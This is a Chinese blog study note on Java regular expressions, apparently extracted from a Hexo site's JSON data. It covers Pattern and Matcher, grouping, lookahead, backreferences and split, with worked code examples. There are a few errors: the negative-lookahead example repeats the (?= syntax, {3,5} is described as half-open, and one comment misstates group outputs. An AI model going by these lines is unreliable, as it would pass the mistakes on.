class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.util.regex.Matcher;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.regex.Pattern;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">r1</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        String content=<span class=\"string\">&quot;dsfdsfds s7789 nn1189han&quot;</span>;</span><br><span class=\"line\"><span class=\"comment\">//      String regStr=&quot;^[0-9]+[a-z]+\\\\d+$&quot;;</span></span><br><span class=\"line\">        String regStr=<span class=\"string\">&quot;(?&lt;g1&gt;\\\\d\\\\d)(?&lt;g2&gt;\\\\d\\\\d)&quot;</span>;</span><br><span class=\"line\">        Pattern pattern=Pattern.compile(regStr);</span><br><span class=\"line\">        <span class=\"comment\">//创建一个匹配器对象</span></span><br><span class=\"line\">        Matcher matcher= pattern.matcher(content);</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (matcher.find()) &#123;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;找到：&quot;</span> + matcher.group(<span class=\"number\">0</span>)); <span class=\"comment\">// 2000</span></span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;分组1(根据组名): &quot;</span>+matcher.group(<span class=\"string\">&quot;g1&quot;</span>));</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;分组1: &quot;</span>+matcher.group(<span class=\"number\">1</span>));</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;分组2(根据组名): &quot;</span>+matcher.group(<span class=\"string\">&quot;g2&quot;</span>));</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;分组2: &quot;</span>+matcher.group(<span class=\"number\">2</span>));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/java%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20211207234020782.png\"></p>\n<h4 id=\"非捕获分组\"><a href=\"#非捕获分组\" class=\"headerlink\" title=\"非捕获分组\"></a>非捕获分组</h4><h5 id=\"pattern-1\"><a href=\"#pattern-1\" class=\"headerlink\" title=\"(?:pattern)\"></a>(?:pattern)</h5><p>非捕获分组不算入分组内,即不能通过group(i)去访问</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.util.regex.Matcher;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.regex.Pattern;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">r1</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        String content=<span class=\"string\">&quot;124张三男士  hell张三先生   张三同学  &quot;</span>;</span><br><span class=\"line\"><span class=\"comment\">//      String regStr=&quot;^[0-9]+[a-z]+\\\\d+$&quot;;</span></span><br><span class=\"line\">        String regStr=<span class=\"string\">&quot;张三(?:男士|先生|同学)&quot;</span>;<span class=\"comment\">//等价于:张三男士|张三先生|张三同学</span></span><br><span class=\"line\">        Pattern pattern=Pattern.compile(regStr);</span><br><span class=\"line\">        <span class=\"comment\">//创建一个匹配器对象</span></span><br><span class=\"line\">        Matcher matcher= pattern.matcher(content);</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (matcher.find()) &#123;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;找到：&quot;</span> + matcher.group(<span class=\"number\">0</span>)); <span class=\"comment\">// 2000</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/java%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20211208235406173.png\"></p>\n<h5 id=\"pattern-2\"><a href=\"#pattern-2\" class=\"headerlink\" title=\"(?=pattern)\"></a>(?=pattern)</h5><p>它是一个非捕获匹配,例如,”windows(?=95|98|NT|2000)”匹配”windows2000”中的”windows”,但不匹配”windows10”中的windows</p>\n<p>(理解这个等号的含义即可)</p>\n<h5 id=\"pattern-3\"><a href=\"#pattern-3\" class=\"headerlink\" title=\"(?!pattern)\"></a>(?!pattern)</h5><p>与上一个刚好相反,例如,”windows(?=95|98|NT|2000)”匹配”windows10”中的”windows”,但不匹配”windows2000”中的windows</p>\n<p>(理解!与=的相反含义)</p>\n<h4 id=\"匹配汉字\"><a href=\"#匹配汉字\" class=\"headerlink\" title=\"匹配汉字\"></a>匹配汉字</h4><p><code>resStr = &quot;^[\\u0391-\\uffe5]+$&quot;</code></p>\n<p>上面的regStr匹配纯汉字</p>\n<p>\\u0391-\\uffe5是汉字的编码范围</p>\n<p>一些练习:</p>\n<p>匹配1-9开头的六位数:  <code>^[1-9]\\\\d&#123;5&#125;$</code></p>\n<p>匹配必须以13,14,15,18开头的11位数: <code>^1[3458]\\\\d&#123;9&#125;$</code></p>\n<p>匹配小数或者整数 <code>^[-+]?([1-9]\\\\d*|0)(\\\\.\\\\d+)?$</code></p>\n<h3 id=\"三个常用类\"><a href=\"#三个常用类\" class=\"headerlink\" title=\"三个常用类\"></a>三个常用类</h3><h4 id=\"Pattern类\"><a href=\"#Pattern类\" class=\"headerlink\" title=\"Pattern类\"></a>Pattern类</h4><p>Pattern对象是一个正则表达式对象,Pattern类没有公共构造方法,(不需要new)要创建一个Pattern对象,调用其公共静态方法,它返回一个Pattern对象,该方法接受一个正则表达式作为它的第一个参数,比如</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Pattern p=Pattern.compile(regStr);</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"matches方法\"><a href=\"#matches方法\" class=\"headerlink\" title=\"matches方法\"></a>matches方法</h5><p>如果只是判断是否满足格式,可以使用Pattern的matches,整体匹配,比较简洁,返回一个bool值,但是只能整体匹配,不能分组</p>\n<p><code>Pattern.matches(regStr,content)</code></p>\n<h3 id=\"Matcher类\"><a href=\"#Matcher类\" class=\"headerlink\" title=\"Matcher类\"></a>Matcher类</h3><p>Matcher类是对输入字符进行解释和匹配的引擎,与Pattern类一样,Matcher也没有公共构造方法,需要调用Pattern对象的matcher方法来获得一个Matcher对象,比如</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Matcher matcher= pattern.matcher(content);</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"matcher-start-获取find每一组开始的索引\"><a href=\"#matcher-start-获取find每一组开始的索引\" class=\"headerlink\" title=\"matcher.start();获取find每一组开始的索引\"></a>matcher.start();获取find每一组开始的索引</h5><h5 id=\"matcher-end-获取find每一组尾部的索引\"><a href=\"#matcher-end-获取find每一组尾部的索引\" class=\"headerlink\" title=\"matcher.end();获取find每一组尾部的索引\"></a>matcher.end();获取find每一组尾部的索引</h5><h5 id=\"replaceAll-替换-注意该函数只是返回替换后的结果-并不修改原来conetent\"><a href=\"#replaceAll-替换-注意该函数只是返回替换后的结果-并不修改原来conetent\" class=\"headerlink\" title=\"replaceAll();//替换,注意该函数只是返回替换后的结果,并不修改原来conetent\"></a>replaceAll();//替换,注意该函数只是返回替换后的结果,并不修改原来conetent</h5><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class r1 &#123;</span><br><span class=\"line\">    public static void main(String[] args) &#123;</span><br><span class=\"line\">        String content=&quot;我确实是个傻缺&quot;;</span><br><span class=\"line\">//      String regStr=&quot;^[0-9]+[a-z]+\\\\d+$&quot;;</span><br><span class=\"line\">        String regStr=&quot;确实&quot;;</span><br><span class=\"line\">        Pattern pattern=Pattern.compile(regStr);</span><br><span class=\"line\">        //创建一个匹配器对象</span><br><span class=\"line\">        Matcher matcher= pattern.matcher(content);</span><br><span class=\"line\">        while (matcher.find()) &#123;</span><br><span class=\"line\">            String newContent=matcher.replaceAll(&quot;雀氏&quot;);</span><br><span class=\"line\">            System.out.println(newContent);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"PatternSyntaxException类\"><a href=\"#PatternSyntaxException类\" class=\"headerlink\" title=\"PatternSyntaxException类\"></a>PatternSyntaxException类</h3><p>PatternSyntaxException是一个非强制异常类,它表示一个正则表达式中的语法错误</p>\n<h4 id=\"分组-捕获-反向引用\"><a href=\"#分组-捕获-反向引用\" class=\"headerlink\" title=\"分组,捕获,反向引用\"></a>分组,捕获,反向引用</h4><p>1.分组</p>\n<p>我们可以用圆括号组成一个比较复杂的匹配模式,那么一个圆括号的部分我们可以看作是一个子表达式(一个分组)</p>\n<p>2.捕获</p>\n<p>把正则表达式中子表达式/分组匹配的内容,保存澡内存中以数字编号或显式命名的组里,方便后面引用,从左往右,以分组的左括号为标志,第一个为1,0代表整个表达式匹配内容</p>\n<p>3.<strong>反向引用</strong></p>\n<p>圆括号的内容被捕获偶,可以在这个括号后被引用,从而写出一个比较使用的匹配模式,这个称为反向引用,这种引用既可以是在正则表达式内部,<u>也可以是在正则表达式外部,内部反向引用用<code>\\\\分组号</code>,外部反向引用<code>$分组号</code></u></p>\n<p>例子,匹配回文数</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">String regStr=<span class=\"string\">&quot;(\\\\d)(\\\\d)\\\\2\\\\1&quot;</span>;</span><br></pre></td></tr></table></figure>\n\n<p>—应用示例:</p>\n<p>结巴程序:把 类似: “我….我要….学学学学….编程java!”   通过正则表达式修改为”我要学编程java!”</p>\n<p>思路:</p>\n<p>1.去掉所有的点</p>\n<p>2.去除所有重复字</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        String content=<span class=\"string\">&quot;我....我要....学学学学....编程java!&quot;</span>;</span><br><span class=\"line\">        <span class=\"comment\">//1.去掉所有的点</span></span><br><span class=\"line\">        String regStr=<span class=\"string\">&quot;\\\\.&quot;</span>;</span><br><span class=\"line\">        Pattern pattern=Pattern.compile(regStr);</span><br><span class=\"line\">        Matcher matcher= pattern.matcher(content);</span><br><span class=\"line\">        content=matcher.replaceAll(<span class=\"string\">&quot;&quot;</span>);</span><br><span class=\"line\">        System.out.println(content);</span><br><span class=\"line\">        <span class=\"comment\">//2去除所有重复字</span></span><br><span class=\"line\">        regStr=<span class=\"string\">&quot;(.)\\\\1+&quot;</span>;<span class=\"comment\">//只会匹配到1-多的字符串</span></span><br><span class=\"line\">        pattern=Pattern.compile(regStr);</span><br><span class=\"line\">        matcher=pattern.matcher((content));</span><br><span class=\"line\">        content=matcher.replaceAll(<span class=\"string\">&quot;$1&quot;</span>);<span class=\"comment\">//分组的表达式外引用</span></span><br><span class=\"line\">        System.out.println(content);</span><br><span class=\"line\">    \t<span class=\"comment\">//第2步的代码也可以用一行代码替换</span></span><br><span class=\"line\">        <span class=\"comment\">/*content=Pattern.compile(&quot;(.)\\\\1+&quot;).matcher(content).replaceAll(&quot;$1&quot;);</span></span><br><span class=\"line\"><span class=\"comment\">        System.out.println(content);</span></span><br><span class=\"line\"><span class=\"comment\">        */</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"String类中使用正则表达式\"><a href=\"#String类中使用正则表达式\" class=\"headerlink\" title=\"String类中使用正则表达式\"></a>String类中使用正则表达式</h4><p>String类中可以直接使用</p>\n<ol>\n<li><p>replaceAll()方法</p>\n</li>\n<li><p>matches()方法</p>\n</li>\n<li><p>分割功能    split()方法中可以使用正则表达式</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">r1</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        String content=<span class=\"string\">&quot;hello#abc-jack12smith~河南&quot;</span>;</span><br><span class=\"line\">        <span class=\"comment\">//要求按照#或-或~或数字来分割</span></span><br><span class=\"line\">        String[]spilt = content.split(<span class=\"string\">&quot;#|~|-|\\\\d+&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(String s : spilt)&#123;<span class=\"comment\">//类似于foreach</span></span><br><span class=\"line\">            System.out.println(s);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/java%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20211209124141204.png\"></p>\n</li>\n</ol>\n<h4 id=\"写正则表达式思路\"><a href=\"#写正则表达式思路\" class=\"headerlink\" title=\"写正则表达式思路\"></a>写正则表达式思路</h4><p>1.先写出一个简单的表达式,接着根据各种情况来逐渐完善</p>\n<p>2.如果遇到需要不匹配的内容,可以在()外对其进行匹配,并可以用标志性符号对其设置边界,比如url中的/</p>\n","site":{"data":{}},"excerpt":"","more":"<p>首先感谢<a href=\"https://www.bilibili.com/video/BV1Eq4y1E79W?p=1&spm_id_from=pageDriver\">韩顺平老师的课程</a>!!</p>\n<h4 id=\"正则匹配中贪婪模式和非贪婪模式的区别\"><a href=\"#正则匹配中贪婪模式和非贪婪模式的区别\" class=\"headerlink\" title=\"正则匹配中贪婪模式和非贪婪模式的区别\"></a>正则匹配中贪婪模式和非贪婪模式的区别</h4><p>我个人理解为,贪婪模式情况下,会尽可能多的进行每一次的匹配,非贪婪模式每一次进行匹配都会找尽可能短的满足<code>?</code>前条件的字符完成本次匹配</p>\n<h4 id=\"java正则简单实现\"><a href=\"#java正则简单实现\" class=\"headerlink\" title=\"java正则简单实现\"></a>java正则简单实现</h4><p>简单实践,后面记录各个类和方法的信息</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.util.regex.Matcher;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.regex.Pattern;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">r1</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        String content=<span class=\"string\">&quot;2000年5月，JDK1.3、JDK1.4和J2SE1.3相继发布，几周后其获得了Apple公司Mac OS X的工业标准的支持。2001年9月24日，J2EE1.3发布。&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot;2002年2月26日，J2SE1.4发布。自此Java的计算能力有了大幅提升，与J2SE1.3相比，其多了近62%的类和接口。在这些新特性当中，还提供了广泛的XML支持、安全套接字（Socket）支持（通过SSL与TLS协议）、全新的I/OAPI、正则表达式、日志与断言。&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot;2004年9月30日，J2SE1.5发布，成为Java语言发展史上的又一里程碑。为了表示该版本的重要性，J2SE 1.5更名为Java SE 5.0（内部版本号1.5.0），&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot;代号为“Tiger”，Tiger包含了从1996年发布1.0版本以来的最重大的更新，其中包括泛型支持、基本类型的自动装箱、改进的循环、枚举类型、&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot;格式化I/O及可变参数。&quot;</span>;</span><br><span class=\"line\">\t\t<span class=\"comment\">//匹配数字或者单词</span></span><br><span class=\"line\">        Pattern pattern = Pattern.compile(<span class=\"string\">&quot;\\\\d\\\\d\\\\d\\\\d&quot;</span>);</span><br><span class=\"line\">        <span class=\"comment\">//2.创建一个匹配器对象</span></span><br><span class=\"line\">        Matcher matcher= pattern.matcher(content);</span><br><span class=\"line\">        <span class=\"comment\">//可以循环匹配</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span>(matcher.find())&#123;</span><br><span class=\"line\">            <span class=\"comment\">//匹配文本放到matcher.group(0)</span></span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;找到&quot;</span>+matcher.group(<span class=\"number\">0</span>));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"matcher-find-完成的任务\"><a href=\"#matcher-find-完成的任务\" class=\"headerlink\" title=\"matcher.find()完成的任务:\"></a><code>matcher.find()</code>完成的任务:</h5><p>1.根据指定的规则定位满足规则的子字符串(比如2000)</p>\n<p>2.找到后,将子字符串的开始索引记录到matcher对象的属性int[] groups;</p>\n<p><img src=\"/images/java%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20211207000454930.png\" alt=\"image-20211207000454930\"></p>\n<p><img src=\"/images/java%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20211207000542796.png\"></p>\n<p>groups[0]=0,把该子字符串的结束的索引+1的值记录到groups[1]=4</p>\n<p>3.同时记录oldLast值为子字符串的结束的索引+1,即下次执行find方法时就从记录的索引位置4开始匹配</p>\n<p>group()源码</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> String <span class=\"title\">group</span><span class=\"params\">(<span class=\"keyword\">int</span> group)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (first &lt; <span class=\"number\">0</span>)</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> IllegalStateException(<span class=\"string\">&quot;No match found&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (group &lt; <span class=\"number\">0</span> || group &gt; groupCount())</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> IndexOutOfBoundsException(<span class=\"string\">&quot;No group &quot;</span> + group);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ((groups[group*<span class=\"number\">2</span>] == -<span class=\"number\">1</span>) || (groups[group*<span class=\"number\">2</span>+<span class=\"number\">1</span>] == -<span class=\"number\">1</span>))</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> getSubSequence(groups[group * <span class=\"number\">2</span>], groups[group * <span class=\"number\">2</span> + <span class=\"number\">1</span>]).toString();<span class=\"comment\">//截取字符串</span></span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>1.根据groups[0]和groups[1]的记录位置,从content开始截取,从content开始截取字符串返回就是[0,4),包含0但是不包含索引为4的位置</p>\n<p>如果再次执行find方法,仍然按照上面的方法,groups[0]和groups[1]记录本次的开始和结束位置,group[0]记录的是下次!<img src=\"/images/java%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20211207001258292.png\"></p>\n<p><code>Pattern pattern = Pattern.compile(&quot;(\\\\d\\\\d)(\\\\d\\\\d)&quot;);</code>加上括号,分组匹配:</p>\n<p>根据指定的规则，定位满足规则的子字符串(比如(20)(00))</p>\n<p>1.找到后将 子字符串的开始索引 group[0]=0 记录到 matcher 对象的熟悉 int[] groups数组中；<br>2.1 groups[0] = 0, 把该子字符串的结束的索引+1的值记录到 groups[1] = 4<br>2.2 记录1组()匹配到的子字符串 groups[2] = 0 groups[3] = 2<br>2.3 记录2组()匹配到的子字符串 groups[4] = 2 groups[5] = 4</p>\n<p><img src=\"/images/java%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20211207004146025.png\"></p>\n<p>2.4 如果有更多的分组，同理</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">while</span> (matcher.find()) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;找到：&quot;</span> + matcher.group(<span class=\"number\">0</span>)); <span class=\"comment\">// 2000</span></span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;第一组匹配到的值: &quot;</span> + matcher.group(<span class=\"number\">1</span>)); <span class=\"comment\">// 2</span></span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;第二组匹配到的值: &quot;</span> + matcher.group(<span class=\"number\">2</span>)); <span class=\"comment\">// 000</span></span><br><span class=\"line\">            <span class=\"comment\">// System.out.println(&quot;找到：&quot; + matcher.group(3)); 索引越界</span></span><br><span class=\"line\">        &#125;</span><br></pre></td></tr></table></figure>\n\n<img src=\"/images/java%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20211207004834793.png\" style=\"zoom:80%;\" />\n\n<p>3.同时记录 oldLast 的值为 子字符串的结束的 索引+1的值即69，即下次执行find时，就从69开始匹配。</p>\n<p><strong>我的理解是,group[0]永远获取的是每次整个表达式匹配的结果,group(1)和group(2)则是每次匹配到的括号内的内容</strong></p>\n<h5 id=\"转义字符的使用\"><a href=\"#转义字符的使用\" class=\"headerlink\" title=\"转义字符的使用\"></a>转义字符的使用</h5><p>注:在java的正则表达式中,两个\\\\代表一个\\</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Demo</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        String content = <span class=\"string\">&quot;abc$(a.bc(123(&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 俩个 \\\\ 字符表示 \\</span></span><br><span class=\"line\">        Pattern compile = Pattern.compile(<span class=\"string\">&quot;\\\\(&quot;</span>);</span><br><span class=\"line\">        <span class=\"comment\">// 2.创建一个匹配器对象</span></span><br><span class=\"line\">        Matcher matcher = compile.matcher(content);</span><br><span class=\"line\">        <span class=\"comment\">// 3. 可以循环匹配</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> (matcher.find()) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// 匹配内容，文本，放到 m.group(0)</span></span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;找到：&quot;</span> + matcher.group(<span class=\"number\">0</span>));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"区分大小写\"><a href=\"#区分大小写\" class=\"headerlink\" title=\"区分大小写\"></a>区分大小写</h4><p>java正则表达式默认是区分大小写的,如何实现不区分大小写</p>\n<ul>\n<li>(?i)abc      表示abc都不区分大小写</li>\n<li>a(?i)bc       表示bc不区分大小写</li>\n<li>a((?i)b)c     表示只有b不区分大小写</li>\n<li><code>Pattern pat  = Pattern.compile(regEx,pattern.CASE_INSENSITIVE);</code>开启不区分大小写的匹配,整个regEx都不区分大小写</li>\n</ul>\n<h4 id=\"关于-的一些注意点\"><a href=\"#关于-的一些注意点\" class=\"headerlink\" title=\"关于[ ]的一些注意点\"></a>关于[ ]的一些注意点</h4><p>^在[ ]内表示非</p>\n<p>[ ]内的任意字符之间都是或的关系</p>\n<p>[ ]内的符号就只是一个符号了,不带特殊功能    <strong>注意:在( )内要加转义符</strong></p>\n<h4 id=\"限定符\"><a href=\"#限定符\" class=\"headerlink\" title=\"限定符\"></a>限定符</h4><table>\n<thead>\n<tr>\n<th>示例</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>(abc)*</td>\n<td>仅包含任意个abc的字符串</td>\n</tr>\n<tr>\n<td>m+(abc)*</td>\n<td>以m开头,后接任意个abc的字符串</td>\n</tr>\n<tr>\n<td>m+abc?</td>\n<td>以m开头,后接ab或者abc的字符串</td>\n</tr>\n<tr>\n<td>[abcd]{3}</td>\n<td>由abcd中字母组成的任意长度为3的字符串</td>\n</tr>\n<tr>\n<td>[abcd]{3,}</td>\n<td>由abcd中字母组成的任意长度不小于3的字符串</td>\n</tr>\n<tr>\n<td>[abcd]{3,5}</td>\n<td>由abcd中字母组成的任意长度不小于3,不大于5的字符串(左闭右开)</td>\n</tr>\n</tbody></table>\n<p>java匹配默认贪婪匹配</p>\n<h4 id=\"定位符\"><a href=\"#定位符\" class=\"headerlink\" 